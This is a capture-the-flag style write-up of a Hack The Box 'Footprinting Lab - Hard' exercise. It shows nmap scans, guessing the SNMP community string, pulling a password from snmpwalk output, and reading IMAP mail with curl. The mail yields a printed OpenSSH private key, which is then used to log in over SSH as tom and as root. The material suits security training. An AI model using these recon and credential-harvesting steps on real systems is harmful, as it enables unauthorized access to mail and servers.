title: Footprinting Lab - Hard
date: 2024-04-15
published: True



Part of the [[Footprinting]] module, one of the learning modules for the Hack The Box CPTS course.  
## Information Gathering
The server is an MX and management server for the internal network.  
This server has the function of a backup server for the internal accounts in the domain.  
## Footprinting
### NMAP
`nmap 10.129.202.20`  

```
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```  

I see SSH, IMAP, POP3.  
Lets do a more intensive scan:  
`nmap -p 22,110,143,993,995 -sV -sC 10.129.202.20`
```  
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f4c8f10f1aebecd31247ca14eab846d (RSA)
|   256 7b30376750b9ad91c08ff702783b7c02 (ECDSA)
|_  256 889e0e07fecad05c60abcf1099cd6ca7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_pop3-capabilities: SASL(PLAIN) UIDL PIPELINING CAPA AUTH-RESP-CODE RESP-CODES STLS USER TOP
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: post-login IDLE IMAP4rev1 have ENABLE LOGIN-REFERRALS more SASL-IR Pre-login listed LITERAL+ OK AUTH=PLAINA0001 STARTTLS capabilities ID
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: IDLE IMAP4rev1 have ENABLE LOGIN-REFERRALS more SASL-IR Pre-login post-login LITERAL+ OK listed AUTH=PLAINA0001 capabilities ID
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER SASL(PLAIN) CAPA UIDL PIPELINING TOP AUTH-RESP-CODE RESP-CODES
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```  
On the pop3 service on port 110, the following commands are allowed:  
`SASL(PLAIN) UIDL PIPELINING CAPA AUTH-RESP-CODE RESP-CODES STLS USER TOP`  
We also know it is IMAP version`IMAP4rev1`.  
Lets check UDP ports with NMAP:  
`sudo nmap 10.129.53.251 -sU`
```  
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-08 22:38 GMT
Stats: 0:11:12 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 70.80% done; ETC: 22:54 (0:04:38 remaining)
Stats: 0:14:35 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 89.20% done; ETC: 22:55 (0:01:46 remaining)
Stats: 0:18:45 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 99.99% done; ETC: 22:57 (0:00:00 remaining)
Nmap scan report for 10.129.53.251
Host is up (0.21s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
```  
### Footprinting SNMP
First, onesixtyone as we don't know the community string:  
`onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.53.251`  
```
Scanning 1 hosts, 3220 communities
10.129.53.251 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```  
Found community string "backup"  
Next Braa:  
`braa backup@10.129.53.251:.1.3.6.*`  
```
10.129.53.251:82ms:.0:Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
10.129.53.251:82ms:.0:.10
10.129.53.251:82ms:.0:201344
10.129.53.251:2296ms:.0:Admin <tech@inlanefreight.htb>
10.129.53.251:1784ms:.0:Admin <tech@inlanefreight.htb>
10.129.53.251:1272ms:.0:Admin <tech@inlanefreight.htb>
```  
We get some good info, lets use snmpwalk since we know the community string:  
`snmpwalk -v2c -c backup 10.129.53.251`  
From the SNMPwalk output we gather a few things:  
Possible password for user tom:  
`tom NMds732Js2761`  
It is running `SNMPv2`  
With this username and password, we can try to use it with SSH or IMAP or POP3  
### Footprinting IMAP, POP3
#### IMAP
Lets try connecting to the IMAP and POP3 services using openssl:  
`openssl s_client -connect 10.129.202.20:imaps`  
After connecting to IMAP, not commands were allowed.  
Lets try using the tom credentials:  
`curl -k 'imaps://<FQDN/IP>' --user tom:NMds732Js2761`  
```
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
```  
After looking at each folder using :  
`curl -k 'imaps://10.129.53.251' --user tom:NMds732Js2761 -X "SELECT INBOX"`  
we only found a message in INBOX:  
```
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
```
Look at email:  
`1 FETCH 1 BODY[TEXT]`  
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQqYreqEj6pjTj8wguR0Sd
hfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHFdND3urVhelyuQ89BtJqB
abmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/ong1nlguuJGc1s47tqKBP
HuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZISazgCz/D6IdVMXilAUFKQ
X1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06OqMb9StNGOnkqY8rIHPga
H/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtbDFv9M3j0SjsMTr2Q0B0O
jKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmpNrS7qSjxO0N143zMRDZy
Ex74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpAVj6YYkMDtL86RN6o8u1x
3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVeoYK9OJJ3hJeJ7SpCt2GG
cAAAdIRrOunEazrpwAAAAHc3NoLXJzYQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxy
U9XWTS+UBbY3lVFH0t+F+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQ
qYreqEj6pjTj8wguR0SdhfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHF
dND3urVhelyuQ89BtJqBabmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/o
ng1nlguuJGc1s47tqKBPHuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZIS
azgCz/D6IdVMXilAUFKQX1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06O
qMb9StNGOnkqY8rIHPgaH/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtb
DFv9M3j0SjsMTr2Q0B0OjKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmp
NrS7qSjxO0N143zMRDZyEx74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpA
Vj6YYkMDtL86RN6o8u1x3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVe
oYK9OJJ3hJeJ7SpCt2GGcAAAADAQABAAACAQC0wxW0LfWZ676lWdi9ZjaVynRG57PiyTFY
jMFqSdYvFNfDrARixcx6O+UXrbFjneHA7OKGecqzY63Yr9MCka+meYU2eL+uy57Uq17ZKy
zH/oXYQSJ51rjutu0ihbS1Wo5cv7m2V/IqKdG/WRNgTFzVUxSgbybVMmGwamfMJKNAPZq2
xLUfcemTWb1e97kV0zHFQfSvH9wiCkJ/rivBYmzPbxcVuByU6Azaj2zoeBSh45ALyNL2Aw
HHtqIOYNzfc8rQ0QvVMWuQOdu/nI7cOf8xJqZ9JRCodiwu5fRdtpZhvCUdcSerszZPtwV8
uUr+CnD8RSKpuadc7gzHe8SICp0EFUDX5g4Fa5HqbaInLt3IUFuXW4SHsBPzHqrwhsem8z
tjtgYVDcJR1FEpLfXFOC0eVcu9WiJbDJEIgQJNq3aazd3Ykv8+yOcAcLgp8x7QP+s+Drs6
4/6iYCbWbsNA5ATTFz2K5GswRGsWxh0cKhhpl7z11VWBHrfIFv6z0KEXZ/AXkg9x2w9btc
dr3ASyox5AAJdYwkzPxTjtDQcN5tKVdjR1LRZXZX/IZSrK5+Or8oaBgpG47L7okiw32SSQ
5p8oskhY/He6uDNTS5cpLclcfL5SXH6TZyJxrwtr0FHTlQGAqpBn+Lc3vxrb6nbpx49MPt
DGiG8xK59HAA/c222dwQAAAQEA5vtA9vxS5n16PBE8rEAVgP+QEiPFcUGyawA6gIQGY1It
4SslwwVM8OJlpWdAmF8JqKSDg5tglvGtx4YYFwlKYm9CiaUyu7fqadmncSiQTEkTYvRQcy
tCVFGW0EqxfH7ycA5zC5KGA9pSyTxn4w9hexp6wqVVdlLoJvzlNxuqKnhbxa7ia8vYp/hp
6EWh72gWLtAzNyo6bk2YykiSUQIfHPlcL6oCAHZblZ06Usls2ZMObGh1H/7gvurlnFaJVn
CHcOWIsOeQiykVV/l5oKW1RlZdshBkBXE1KS0rfRLLkrOz+73i9nSPRvZT4xQ5tDIBBXSN
y4HXDjeoV2GJruL7qAAAAQEA/XiMw8fvw6MqfsFdExI6FCDLAMnuFZycMSQjmTWIMP3cNA
2qekJF44lL3ov+etmkGDiaWI5XjUbl1ZmMZB1G8/vk8Y9ysZeIN5DvOIv46c9t55pyIl5+
fWHo7g0DzOw0Z9ccM0lr60hRTm8Gr/Uv4TgpChU1cnZbo2TNld3SgVwUJFxxa//LkX8HGD
vf2Z8wDY4Y0QRCFnHtUUwSPiS9GVKfQFb6wM+IAcQv5c1MAJlufy0nS0pyDbxlPsc9HEe8
EXS1EDnXGjx1EQ5SJhmDmO1rL1Ien1fVnnibuiclAoqCJwcNnw/qRv3ksq0gF5lZsb3aFu
kHJpu34GKUVLy74QAAAQEA+UBQH/jO319NgMG5NKq53bXSc23suIIqDYajrJ7h9Gef7w0o
eogDuMKRjSdDMG9vGlm982/B/DWp/Lqpdt+59UsBceN7mH21+2CKn6NTeuwpL8lRjnGgCS
t4rWzFOWhw1IitEg29d8fPNTBuIVktJU/M/BaXfyNyZo0y5boTOELoU3aDfdGIQ7iEwth5
vOVZ1VyxSnhcsREMJNE2U6ETGJMY25MSQytrI9sH93tqWz1CIUEkBV3XsbcjjPSrPGShV/
H+alMnPR1boleRUIge8MtQwoC4pFLtMHRWw6yru3tkRbPBtNPDAZjkwF1zXqUBkC0x5c7y
XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```
Looks like we found the private key we need for ssh.  
lets SSH as user TOM  
#### POP3
`openssl s_client -connect 10.129.202.20:pop3s`  
same result.

### Footprinting SSH
````shell-session
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py 10.129.202.20  
````
It is running `OpenSSH 8.2p1`  
No apparent footholds.  
Lets try to SSH in with the username and password we found:  
tom@10.129.53.251: Permission denied (publickey).  
We will need tom's private key to SSH in.  
Using the key we found in the IMAP email and setting the permissions:  
`sudo chmod 600 /home/htb-ac-1102340/sshkey/privkey`  
I also had to change the owner of the file to `htb-ac-1102340` instead of `root`:  
`sudo chown htb-ac-1102340:htb-ac-1102340 /home/htb-ac-1102340/sshkey/privkey`  
Then I SSHed into the machine:  
`ssh -i /home/htb-ac-1102340/sshkey/privkey tom@10.129.53.251`  
could not find anything useful, lets try as root:  
`ssh -i /home/htb-ac-1102340/sshkey/privkey root@10.129.53.251`  
It worked, here we find users.sql, with the HTB user password.  
Done!
